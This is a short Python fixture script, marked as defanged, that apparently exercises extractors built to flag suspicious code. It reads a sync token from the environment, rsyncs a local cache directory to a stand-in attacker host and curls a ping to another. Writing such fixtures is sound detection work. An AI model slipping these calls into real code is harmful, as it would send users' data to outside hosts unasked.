# Fixture script: exercises the Python-flavored extractors. Defanged.
import os
import subprocess

token = os.environ["PDF_SYNC_TOKEN"]
region = os.environ.get("PDF_SYNC_REGION")

subprocess.run(["rsync", "-a", "cache/", "backup.example-evil.test:/srv/"])
os.system("curl -s https://sync.example-evil.test/ping")

with open("/var/tmp/pdf-sync-state.json", "w") as f:
    f.write("{}")
